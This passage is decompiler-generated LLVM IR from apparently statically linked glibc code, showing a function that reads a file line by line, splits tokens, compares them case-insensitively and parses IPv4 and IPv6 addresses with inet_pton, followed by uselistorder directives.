  %v4_8057d25 = icmp eq i8 %v2_8057d23, 0
  br i1 %v4_8057d25, label %dec_label_pc_8057d23.dec_label_pc_8057d5c.loopexit_crit_edge, label %dec_label_pc_8057d29

dec_label_pc_8057d29:                             ; preds = %dec_label_pc_8057d23.preheader, %dec_label_pc_8057d1f
  %v2_8057d23105 = phi i8 [ %v2_8057d23, %dec_label_pc_8057d1f ], [ %v2_8057d2396, %dec_label_pc_8057d23.preheader ]
  %v1_8057d23104 = phi i8* [ %v1_8057d23, %dec_label_pc_8057d1f ], [ %v1_8057d2395, %dec_label_pc_8057d23.preheader ]
  %v0_8057d1f103 = phi i32 [ %v1_8057d22, %dec_label_pc_8057d1f ], [ %v0_8057d2349, %dec_label_pc_8057d23.preheader ]
  %v2_8057d29 = sext i8 %v2_8057d23105 to i32
  store i32 %v2_8057d29, i32* @edx, align 4
  %v0_8057d2c = load i32, i32* @global_var_805c278, align 8
  store i32 %v0_8057d2c, i32* %eax.global-to-local, align 4
  %v2_8057d31 = mul nsw i32 %v2_8057d29, 2
  %v3_8057d31 = add i32 %v0_8057d2c, %v2_8057d31
  %v4_8057d31 = inttoptr i32 %v3_8057d31 to i8*
  %v5_8057d31 = load i8, i8* %v4_8057d31, align 1
  %v6_8057d31 = and i8 %v5_8057d31, 32
  %v7_8057d31 = icmp eq i8 %v6_8057d31, 0
  %v1_8057d35 = icmp eq i1 %v7_8057d31, false
  br i1 %v1_8057d35, label %dec_label_pc_8057d1f, label %dec_label_pc_8057d37

dec_label_pc_8057d37:                             ; preds = %dec_label_pc_8057d29
  %v0_8057d37 = load i32, i32* @edi, align 4
  %v1_8057d37 = add i32 %v0_8057d37, -6
  %v6_8057d37 = sub i32 5, %v0_8057d37
  %v7_8057d37 = and i32 %v6_8057d37, %v0_8057d37
  %v8_8057d37 = icmp slt i32 %v7_8057d37, 0
  %v9_8057d37 = icmp eq i32 %v1_8057d37, 0
  %v10_8057d37 = icmp slt i32 %v1_8057d37, 0
  %v3_8057d3a = icmp eq i1 %v10_8057d37, %v8_8057d37
  %v4_8057d3a = icmp eq i1 %v9_8057d37, false
  %v5_8057d3a = and i1 %v4_8057d3a, %v3_8057d3a
  br i1 %v5_8057d3a, label %dec_label_pc_8057d43.preheader, label %dec_label_pc_8057d3c

dec_label_pc_8057d3c:                             ; preds = %dec_label_pc_8057d37
  %v1_8057d3c = load i32, i32* @ebx, align 4
  %v3_8057d3c = mul i32 %v0_8057d37, 4
  %v4_8057d3c = add i32 %v1_8057d3c, %v3_8057d3c
  %v5_8057d3c = inttoptr i32 %v4_8057d3c to i32*
  store i32 %v0_8057d1f103, i32* %v5_8057d3c, align 4
  %v0_8057d3f = load i32, i32* @edi, align 4
  %v1_8057d3f = add i32 %v0_8057d3f, 1
  store i32 %v1_8057d3f, i32* @edi, align 4
  %v0_8057d43.pre.pre = load i32, i32* @ecx, align 4
  %v4_8057d43.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057d43.preheader

dec_label_pc_8057d43.preheader:                   ; preds = %dec_label_pc_8057d3c, %dec_label_pc_8057d37
  %v4_8057d43.pre = phi i32 [ %v4_8057d43.pre.pre, %dec_label_pc_8057d3c ], [ %v0_8057d2c, %dec_label_pc_8057d37 ]
  %v0_8057d43.pre = phi i32 [ %v0_8057d43.pre.pre, %dec_label_pc_8057d3c ], [ %v0_8057d1f103, %dec_label_pc_8057d37 ]
  %v0_8057d5c54 = phi i32 [ %v1_8057d3f, %dec_label_pc_8057d3c ], [ %v0_8057d37, %dec_label_pc_8057d37 ]
  %v1_8057d43106 = inttoptr i32 %v0_8057d43.pre to i8*
  %v2_8057d43107 = load i8, i8* %v1_8057d43106, align 1
  %v3_8057d43108 = zext i8 %v2_8057d43107 to i32
  %v5_8057d43109 = and i32 %v4_8057d43.pre, -256
  %v6_8057d43110 = or i32 %v3_8057d43108, %v5_8057d43109
  store i32 %v6_8057d43110, i32* @eax, align 4
  %v4_8057d45111 = icmp eq i8 %v2_8057d43107, 0
  br i1 %v4_8057d45111, label %dec_label_pc_8057d57.loopexit, label %dec_label_pc_8057d49.lr.ph

dec_label_pc_8057d49.lr.ph:                       ; preds = %dec_label_pc_8057d43.preheader
  %v0_8057d4c.pre = load i32, i32* @global_var_805c278, align 8
  br label %dec_label_pc_8057d49

dec_label_pc_8057d42:                             ; preds = %dec_label_pc_8057d49
  %v1_8057d42 = add i32 %v0_8057d57113, 1
  store i32 %v1_8057d42, i32* @ecx, align 4
  %v1_8057d43 = inttoptr i32 %v1_8057d42 to i8*
  %v2_8057d43 = load i8, i8* %v1_8057d43, align 1
  %v3_8057d43 = zext i8 %v2_8057d43 to i32
  %v5_8057d43 = and i32 %v0_8057d4c.pre, -256
  %v6_8057d43 = or i32 %v3_8057d43, %v5_8057d43
  store i32 %v6_8057d43, i32* @eax, align 4
  %v4_8057d45 = icmp eq i8 %v2_8057d43, 0
  br i1 %v4_8057d45, label %dec_label_pc_8057d57.loopexit, label %dec_label_pc_8057d49

dec_label_pc_8057d49:                             ; preds = %dec_label_pc_8057d49.lr.ph, %dec_label_pc_8057d42
  %v2_8057d43115 = phi i8 [ %v2_8057d43107, %dec_label_pc_8057d49.lr.ph ], [ %v2_8057d43, %dec_label_pc_8057d42 ]
  %v1_8057d43114 = phi i8* [ %v1_8057d43106, %dec_label_pc_8057d49.lr.ph ], [ %v1_8057d43, %dec_label_pc_8057d42 ]
  %v0_8057d57113 = phi i32 [ %v0_8057d43.pre, %dec_label_pc_8057d49.lr.ph ], [ %v1_8057d42, %dec_label_pc_8057d42 ]
  %v2_8057d49 = sext i8 %v2_8057d43115 to i32
  store i32 %v2_8057d49, i32* @edx, align 4
  store i32 %v0_8057d4c.pre, i32* @eax, align 4
  %v2_8057d51 = mul nsw i32 %v2_8057d49, 2
  %v3_8057d51 = add i32 %v0_8057d4c.pre, %v2_8057d51
  %v4_8057d51 = inttoptr i32 %v3_8057d51 to i8*
  %v5_8057d51 = load i8, i8* %v4_8057d51, align 1
  %v6_8057d51 = and i8 %v5_8057d51, 32
  %v7_8057d51 = icmp eq i8 %v6_8057d51, 0
  br i1 %v7_8057d51, label %dec_label_pc_8057d42, label %dec_label_pc_8057d57.loopexit

dec_label_pc_8057d57.loopexit:                    ; preds = %dec_label_pc_8057d49, %dec_label_pc_8057d42, %dec_label_pc_8057d43.preheader
  %v4_8057d2398139 = phi i32 [ %v6_8057d43110, %dec_label_pc_8057d43.preheader ], [ %v6_8057d43, %dec_label_pc_8057d42 ], [ %v0_8057d4c.pre, %dec_label_pc_8057d49 ]
  %v0_8057d57.lcssa = phi i32 [ %v0_8057d43.pre, %dec_label_pc_8057d43.preheader ], [ %v1_8057d42, %dec_label_pc_8057d42 ], [ %v0_8057d57113, %dec_label_pc_8057d49 ]
  %v1_8057d43.lcssa = phi i8* [ %v1_8057d43106, %dec_label_pc_8057d43.preheader ], [ %v1_8057d43, %dec_label_pc_8057d42 ], [ %v1_8057d43114, %dec_label_pc_8057d49 ]
  %v2_8057d57 = load i8, i8* %v1_8057d43.lcssa, align 1
  %v3_8057d57 = icmp eq i8 %v2_8057d57, 0
  %v1_8057d5a = icmp eq i1 %v3_8057d57, false
  br i1 %v1_8057d5a, label %dec_label_pc_8057d23.preheader, label %dec_label_pc_8057d5c

dec_label_pc_8057d23.preheader:                   ; preds = %dec_label_pc_8057d23.preheader.preheader, %dec_label_pc_8057d57.loopexit
  %v0_8057d5c.pre142 = phi i32 [ %v0_8057d5c54, %dec_label_pc_8057d57.loopexit ], [ 0, %dec_label_pc_8057d23.preheader.preheader ]
  %v4_8057d2398 = phi i32 [ %v4_8057d2398139, %dec_label_pc_8057d57.loopexit ], [ %v4_8057d2398.pre, %dec_label_pc_8057d23.preheader.preheader ]
  %v0_8057d2349 = phi i32 [ %v0_8057d57.lcssa, %dec_label_pc_8057d57.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_8057d23.preheader.preheader ]
  %v1_8057d2395 = inttoptr i32 %v0_8057d2349 to i8*
  %v2_8057d2396 = load i8, i8* %v1_8057d2395, align 1
  %v3_8057d2397 = zext i8 %v2_8057d2396 to i32
  %v5_8057d2399 = and i32 %v4_8057d2398, -256
  %v6_8057d23100 = or i32 %v5_8057d2399, %v3_8057d2397
  store i32 %v6_8057d23100, i32* @eax, align 4
  %v4_8057d25101 = icmp eq i8 %v2_8057d2396, 0
  br i1 %v4_8057d25101, label %dec_label_pc_8057d5c, label %dec_label_pc_8057d29

dec_label_pc_8057d23.dec_label_pc_8057d5c.loopexit_crit_edge: ; preds = %dec_label_pc_8057d1f
  %v0_8057d5c.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057d5c

dec_label_pc_8057d5c:                             ; preds = %dec_label_pc_8057d57.loopexit, %dec_label_pc_8057d23.dec_label_pc_8057d5c.loopexit_crit_edge, %dec_label_pc_8057d23.preheader, %dec_label_pc_8057d17
  %v1_8057d5f = phi i32 [ 0, %dec_label_pc_8057d17 ], [ %v0_8057d5c.pre.pre, %dec_label_pc_8057d23.dec_label_pc_8057d5c.loopexit_crit_edge ], [ %v0_8057d5c.pre142, %dec_label_pc_8057d23.preheader ], [ %v0_8057d5c54, %dec_label_pc_8057d57.loopexit ]
  %v0_8057d5f = load i32, i32* @ebx, align 4
  %v2_8057d5f = mul i32 %v1_8057d5f, 4
  %v3_8057d5f = add i32 %v0_8057d5f, %v2_8057d5f
  %v4_8057d5f = inttoptr i32 %v3_8057d5f to i32*
  store i32 0, i32* %v4_8057d5f, align 4
  %v7_8057d66 = icmp sgt i32 %v1_8057d5f, 1
  br i1 %v7_8057d66, label %dec_label_pc_8057d6c, label %dec_label_pc_8057dff

dec_label_pc_8057d6c:                             ; preds = %dec_label_pc_8057d5c
  br i1 %v12_8057b9e, label %dec_label_pc_8057e39, label %dec_label_pc_8057d77

dec_label_pc_8057d77:                             ; preds = %dec_label_pc_8057d6c
  store i32 1, i32* @esi, align 4
  br i1 %v1_8057d81, label %dec_label_pc_8057daf.preheader, label %dec_label_pc_8057d83

dec_label_pc_8057daf.preheader:                   ; preds = %dec_label_pc_8057d77
  %v1_8057daf119 = load i32, i32* @edi, align 4
  %v5_8057db1128 = icmp sgt i32 %v1_8057daf119, 1
  br i1 %v5_8057db1128, label %dec_label_pc_8057d99.lr.ph, label %dec_label_pc_8057dff

dec_label_pc_8057d99.lr.ph:                       ; preds = %dec_label_pc_8057daf.preheader
  br label %dec_label_pc_8057d99

dec_label_pc_8057d83:                             ; preds = %dec_label_pc_8057d77
  %v0_8057d83 = load i32, i32* @eax, align 4
  %v0_8057d85 = load i32, i32* @ebx, align 4
  %v1_8057d85 = inttoptr i32 %v0_8057d85 to i32*
  %v2_8057d85 = load i32, i32* %v1_8057d85, align 4
  %v5_8057d8b = call i32 @__GI_strcoll(i8* %v2_8057da2, i32 %v2_8057d85, i32 %v0_8057d83, i32 %v0_8057d83)
  store i32 %v5_8057d8b, i32* %eax.global-to-local, align 4
  %v1_8057d93 = icmp eq i32 %v5_8057d8b, 0
  %v1_8057d95 = icmp eq i1 %v1_8057d93, false
  br i1 %v1_8057d95, label %dec_label_pc_8057dff, label %dec_label_pc_8057db5

dec_label_pc_8057d99:                             ; preds = %dec_label_pc_8057d99.lr.ph, %dec_label_pc_8057dae
  %v1_8057d9b129 = phi i32 [ 1, %dec_label_pc_8057d99.lr.ph ], [ %v1_8057dae, %dec_label_pc_8057dae ]
  %v0_8057d9b = load i32, i32* @ebx, align 4
  %v2_8057d9b = mul i32 %v1_8057d9b129, 4
  %v3_8057d9b = add i32 %v0_8057d9b, %v2_8057d9b
  %v4_8057d9b = inttoptr i32 %v3_8057d9b to i32*
  %v5_8057d9b = load i32, i32* %v4_8057d9b, align 4
  %v3_8057da2 = call i32 @__GI_strcasecmp(i8* %v2_8057da2, i32 %v5_8057d9b)
  store i32 %v3_8057da2, i32* %eax.global-to-local, align 4
  %v1_8057daa = icmp eq i32 %v3_8057da2, 0
  br i1 %v1_8057daa, label %dec_label_pc_8057db5, label %dec_label_pc_8057dae

dec_label_pc_8057dae:                             ; preds = %dec_label_pc_8057d99
  %v0_8057dae = load i32, i32* @esi, align 4
  %v1_8057dae = add i32 %v0_8057dae, 1
  store i32 %v1_8057dae, i32* @esi, align 4
  %v1_8057daf = load i32, i32* @edi, align 4
  %v5_8057db1 = icmp slt i32 %v1_8057dae, %v1_8057daf
  br i1 %v5_8057db1, label %dec_label_pc_8057d99, label %dec_label_pc_8057dff

dec_label_pc_8057db5:                             ; preds = %dec_label_pc_8057d83, %dec_label_pc_8057d99
  br i1 %v1_8057dba, label %dec_label_pc_8057dd7, label %dec_label_pc_8057dbc

dec_label_pc_8057dbc:                             ; preds = %dec_label_pc_8057db5
  %v0_8057dbc = load i32, i32* @esi, align 4
  %v3_8057dbd = load i8*, i8** %stack_var_-44, align 4
  %v4_8057dbd = ptrtoint i8* %v3_8057dbd to i32
  %v0_8057dc1 = load i32, i32* @ebx, align 4
  %v1_8057dc1 = inttoptr i32 %v0_8057dc1 to i32*
  %v2_8057dc1 = load i32, i32* %v1_8057dc1, align 4
  %v4_8057dc5 = inttoptr i32 %v2_8057dc1 to i8*
  %v5_8057dc5 = call i32 @inet_pton(i32 2, i8* %v4_8057dc5, i32 %v4_8057dbd, i32 %v0_8057dbc)
  store i32 %v5_8057dc5, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_8057dc5, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_8057c55, label %dec_label_pc_8057dff.outer

dec_label_pc_8057dd7:                             ; preds = %dec_label_pc_8057db5
  br i1 %v1_8057ddc, label %dec_label_pc_8057dff.outer, label %dec_label_pc_8057dde

dec_label_pc_8057dde:                             ; preds = %dec_label_pc_8057dd7
  %v0_8057dde = load i32, i32* @ecx, align 4
  %v0_8057de3 = load i32, i32* @ebx, align 4
  %v1_8057de3 = inttoptr i32 %v0_8057de3 to i32*
  %v2_8057de3 = load i32, i32* %v1_8057de3, align 4
  %v4_8057de7 = inttoptr i32 %v2_8057de3 to i8*
  %v5_8057de7 = call i32 @inet_pton(i32 10, i8* %v4_8057de7, i32 %stack_var_-36.0, i32 %v0_8057dde)
  store i32 %v5_8057de7, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_8057de7, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_8057c82, label %dec_label_pc_8057dff.outer

dec_label_pc_8057dff:                             ; preds = %dec_label_pc_8057daf.preheader, %dec_label_pc_8057dae, %dec_label_pc_8057d5c, %dec_label_pc_8057d83, %dec_label_pc_8057dff.outer
  %v0_8057dff = load i32, i32* @edx, align 4
  %v3_8057e09 = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_8057dff)
  store i32 %v3_8057e09, i32* @eax, align 4
  %v1_8057e11 = icmp eq i32 %v3_8057e09, 0
  %v1_8057e13 = icmp eq i1 %v1_8057e11, false
  br i1 %v1_8057e13, label %dec_label_pc_8057d00, label %dec_label_pc_8057e19

dec_label_pc_8057e19:                             ; preds = %dec_label_pc_8057dff, %dec_label_pc_8057cae
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_8057cae ], [ %stack_var_-28.0.ph, %dec_label_pc_8057dff ]
  br i1 %v12_8057b9e, label %dec_label_pc_8057e39, label %dec_label_pc_8057e20

dec_label_pc_8057e20:                             ; preds = %dec_label_pc_8057e19
  %v1_8057e27 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8057e27 = call i32 @__GI_fclose(i16* %v1_8057e27)
  store i32 %v2_8057e27, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057e39

dec_label_pc_8057e39:                             ; preds = %dec_label_pc_8057d6c, %dec_label_pc_8057b89, %dec_label_pc_8057b95, %dec_label_pc_8057bb3, %dec_label_pc_8057bc6, %dec_label_pc_8057bd2, %dec_label_pc_8057bdb, %dec_label_pc_8057c05, %dec_label_pc_8057e19, %dec_label_pc_8057e20, %dec_label_pc_8057c3b
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8057e19 ], [ %stack_var_-28.1, %dec_label_pc_8057e20 ], [ %v2_8057c4a, %dec_label_pc_8057c3b ], [ 34, %dec_label_pc_8057c05 ], [ 34, %dec_label_pc_8057bdb ], [ 34, %dec_label_pc_8057bd2 ], [ 34, %dec_label_pc_8057bc6 ], [ 34, %dec_label_pc_8057bb3 ], [ 34, %dec_label_pc_8057b95 ], [ 34, %dec_label_pc_8057b89 ], [ %stack_var_-28.0.ph, %dec_label_pc_8057d6c ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8057b74, i32* @ebx, align 4
  store i32 %v0_8057b73, i32* @esi, align 4
  store i32 %v0_8057b72, i32* @edi, align 4
  store i32 %v0_8057b71, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_8057dae, { 0, 2, 1 }
  uselistorder i32 %v1_8057d5f, { 1, 0 }
  uselistorder i8 %v2_8057d2396, { 1, 2, 0 }
  uselistorder i8* %v1_8057d2395, { 1, 0 }
  uselistorder i32 %v0_8057d2349, { 1, 0 }
  uselistorder i32 %v2_8057d49, { 1, 0 }
  uselistorder i32 %v1_8057d42, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8057d4c.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8057d37, { 1, 0 }
  uselistorder i32 %v0_8057d37, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8057d29, { 1, 0 }
  uselistorder i8* %v2_8057da2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8057be7, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8057bc6, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8057ba3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8057baa, { 1, 0 }
  uselistorder i32 %v1_8057b84, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 3, 4, 5, 6, 7, 8, 9, 12, 13, 14, 15, 11, 1, 2, 17, 18, 16, 10, 0 }
  uselistorder i32 (i16*)* @__GI_fclose, { 3, 4, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0, 2 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 5, { 16, 28, 29, 30, 0, 15, 9, 10, 20, 11, 31, 32, 2, 4, 25, 17, 26, 27, 8, 21, 7, 22, 12, 6, 23, 5, 24, 13, 14, 18, 19, 3, 1 }
  uselistorder i32 -6, { 2, 1, 3, 0 }
  uselistorder i8 32, { 20, 21, 22, 23, 24, 16, 0, 7, 17, 13, 14, 15, 8, 25, 18, 19, 26, 27, 2, 11, 3, 9, 1, 12, 4, 10, 5, 6 }
  uselistorder i32* @global_var_805c278, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 -256, { 1, 78, 0, 79, 12, 19, 80, 81, 3, 62, 61, 2, 82, 83, 6, 84, 4, 85, 5, 86, 98, 8, 64, 63, 7, 42, 43, 87, 44, 45, 46, 47, 48, 49, 13, 50, 93, 94, 100, 14, 25, 15, 101, 102, 91, 90, 9, 96, 97, 60, 88, 51, 52, 53, 54, 55, 56, 57, 10, 58, 59, 89, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 16, 17, 18, 11, 92, 95, 99 }
  uselistorder i32 35, { 1, 3, 2, 0 }
  uselistorder i32 10, { 20, 0, 30, 31, 32, 33, 34, 35, 1, 12, 21, 2, 8, 36, 9, 10, 11, 22, 3, 14, 28, 29, 13, 38, 23, 4, 24, 25, 19, 18, 15, 16, 7, 37, 5, 26, 27, 17, 6 }
  uselistorder i32 12, { 79, 80, 81, 0, 82, 17, 41, 1, 83, 98, 24, 22, 7, 23, 8, 9, 10, 11, 12, 13, 14, 84, 58, 59, 60, 61, 62, 63, 64, 65, 2, 18, 19, 66, 67, 68, 132, 27, 42, 78, 97, 43, 44, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 45, 46, 47, 48, 49, 50, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 25, 131, 87, 88, 89, 90, 133, 69, 3, 4, 70, 71, 15, 16, 72, 5, 85, 86, 51, 52, 53, 54, 55, 56, 57, 26, 73, 20, 74, 75, 21, 76, 77, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 91, 92, 93, 94, 95, 96, 6 }
  uselistorder i32 80, { 0, 5, 6, 7, 8, 9, 10, 11, 2, 3, 4, 1 }
  uselistorder i32 56, { 7, 6, 12, 1, 13, 14, 15, 16, 3, 9, 4, 10, 5, 2, 17, 11, 8, 0 }
  uselistorder i32 44, { 11, 12, 13, 8, 1, 9, 10, 23, 15, 7, 20, 22, 21, 17, 18, 19, 16, 14, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 36, { 12, 13, 14, 16, 17, 18, 19, 20, 21, 3, 22, 4, 5, 23, 15, 7, 8, 9, 10, 11, 1, 6, 2, 0 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 15, 17, 18, 0, 8, 5, 1, 10, 6, 7, 11, 12, 13, 14, 4, 3, 16, 2, 9 }
  uselistorder i32 -48, { 2, 3, 4, 1, 0 }
  uselistorder i32 16, { 90, 89, 0, 91, 92, 14, 9, 93, 15, 94, 50, 51, 102, 103, 104, 105, 106, 107, 114, 108, 109, 110, 111, 112, 113, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 95, 96, 97, 98, 52, 53, 54, 55, 56, 57, 58, 59, 135, 16, 17, 30, 20, 44, 31, 39, 86, 40, 139, 1, 41, 42, 43, 3, 2, 133, 5, 4, 134, 7, 6, 125, 126, 18, 140, 99, 100, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 21, 75, 76, 77, 78, 136, 137, 138, 101, 13, 10, 29, 22, 45, 46, 47, 48, 49, 23, 79, 80, 81, 82, 83, 84, 19, 24, 85, 32, 33, 34, 35, 36, 37, 38, 87, 88, 12, 25, 127, 128, 129, 130, 131, 8, 26, 132, 11, 27, 28 }
  uselistorder i32 8, { 129, 128, 130, 0, 1, 131, 132, 133, 134, 135, 136, 8, 137, 2, 17, 138, 139, 140, 141, 33, 142, 90, 37, 19, 20, 21, 22, 38, 23, 24, 39, 40, 25, 41, 26, 42, 43, 144, 91, 92, 93, 94, 95, 96, 35, 34, 97, 98, 99, 100, 205, 206, 207, 30, 213, 31, 214, 32, 49, 27, 70, 127, 157, 71, 72, 159, 160, 161, 162, 163, 164, 165, 9, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 10, 73, 74, 75, 76, 77, 78, 79, 80, 176, 177, 178, 179, 180, 45, 11, 46, 12, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 44, 198, 199, 13, 200, 201, 202, 203, 14, 204, 151, 152, 3, 212, 101, 145, 146, 4, 5, 50, 102, 103, 104, 105, 107, 108, 109, 106, 110, 111, 112, 113, 28, 29, 114, 115, 116, 117, 118, 119, 208, 209, 210, 147, 148, 149, 150, 143, 211, 81, 82, 83, 84, 85, 6, 86, 87, 36, 88, 89, 47, 48, 120, 121, 122, 123, 124, 125, 126, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 18, 153, 154, 155, 156, 7, 158, 16, 15 }
  uselistorder i32 -36, { 1, 0 }
  uselistorder i32 -32, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 32, { 72, 0, 73, 74, 29, 31, 79, 30, 80, 81, 82, 43, 44, 59, 86, 32, 52, 70, 71, 54, 55, 6, 5, 7, 8, 45, 9, 10, 53, 11, 12, 13, 14, 15, 1, 77, 75, 76, 60, 61, 2, 62, 63, 64, 65, 66, 67, 68, 16, 69, 46, 84, 85, 78, 83, 56, 57, 58, 34, 17, 47, 48, 18, 49, 3, 20, 19, 35, 36, 50, 4, 37, 21, 22, 24, 23, 38, 26, 25, 39, 41, 28, 27, 40, 42, 33, 51 }
  uselistorder i32 4, { 266, 267, 268, 262, 260, 261, 263, 264, 265, 0, 6, 269, 270, 271, 272, 273, 274, 275, 276, 277, 34, 55, 148, 149, 150, 35, 36, 37, 278, 50, 1, 231, 7, 8, 187, 188, 189, 190, 191, 192, 279, 280, 283, 284, 285, 286, 287, 288, 60, 289, 295, 296, 297, 69, 38, 298, 299, 300, 301, 39, 40, 41, 70, 42, 43, 71, 44, 302, 45, 303, 72, 46, 73, 74, 9, 290, 291, 75, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 56, 203, 374, 204, 375, 376, 382, 383, 388, 389, 390, 377, 51, 96, 226, 227, 378, 379, 380, 381, 10, 151, 152, 153, 154, 76, 247, 248, 249, 61, 314, 315, 316, 317, 155, 156, 157, 158, 159, 62, 11, 160, 161, 384, 386, 328, 329, 330, 331, 332, 333, 12, 334, 335, 336, 337, 338, 339, 340, 341, 326, 327, 163, 47, 164, 165, 166, 167, 168, 169, 170, 13, 172, 171, 342, 53, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 32, 363, 364, 54, 365, 14, 162, 385, 228, 229, 304, 305, 52, 306, 307, 308, 309, 2, 15, 3, 387, 16, 173, 205, 17, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 48, 49, 97, 77, 223, 224, 225, 292, 293, 57, 294, 281, 282, 78, 174, 175, 176, 18, 177, 19, 33, 20, 21, 178, 179, 22, 180, 79, 181, 80, 182, 183, 184, 81, 185, 82, 83, 186, 230, 232, 233, 234, 58, 235, 236, 237, 63, 64, 65, 238, 84, 85, 86, 87, 88, 66, 239, 89, 240, 67, 241, 242, 59, 243, 244, 245, 68, 246, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 94, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 90, 310, 311, 312, 313, 4, 318, 23, 24, 319, 25, 91, 92, 95, 320, 93, 26, 27, 321, 322, 323, 324, 28, 5, 29, 30, 325, 31, 366, 367, 368, 369, 370, 371, 372, 373, 391, 392, 393, 147 }
  uselistorder i32* @ebp, { 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 9, 10, 11, 12, 13, 14, 15, 2, 89, 90, 91, 96, 92, 93, 94, 95, 97, 36, 37, 98, 102, 113, 114, 144, 145, 146, 38, 39, 40, 41, 42, 228, 16, 17, 18, 72, 73, 199, 200, 201, 202, 203, 19, 20, 204, 205, 206, 207, 208, 209, 210, 211, 216, 212, 213, 214, 215, 1, 217, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 4, 43, 44, 45, 46, 47, 108, 0, 109, 110, 111, 112, 103, 104, 105, 106, 107, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 3, 64, 6, 7, 8, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 65, 66, 67, 99, 100, 101, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 68, 69, 70, 71, 5, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 182, 183, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 218, 219, 220, 221, 224, 225, 222, 223, 229, 226, 227 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8057e39, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8057dff, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_8057db5, { 1, 0 }
  uselistorder label %dec_label_pc_8057d99, { 1, 0 }
  uselistorder label %dec_label_pc_8057d5c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8057d23.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8057d49, { 1, 0 }
  uselistorder label %dec_label_pc_8057d17, { 1, 0 }
